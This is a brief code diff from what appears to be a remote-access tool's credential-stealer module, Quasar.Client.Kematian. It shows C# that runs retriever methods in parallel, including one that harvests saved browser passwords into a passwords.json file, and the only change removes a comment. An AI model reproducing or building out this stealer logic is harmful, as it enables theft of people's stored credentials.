@@ -33,7 +33,6 @@ namespace Quasar.Client.Kematian
                             new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
                     };
 
-                    // Process each method in parallel
                     Parallel.ForEach(methods, methodPair =>
                     {
                         var content = methodPair.Key();
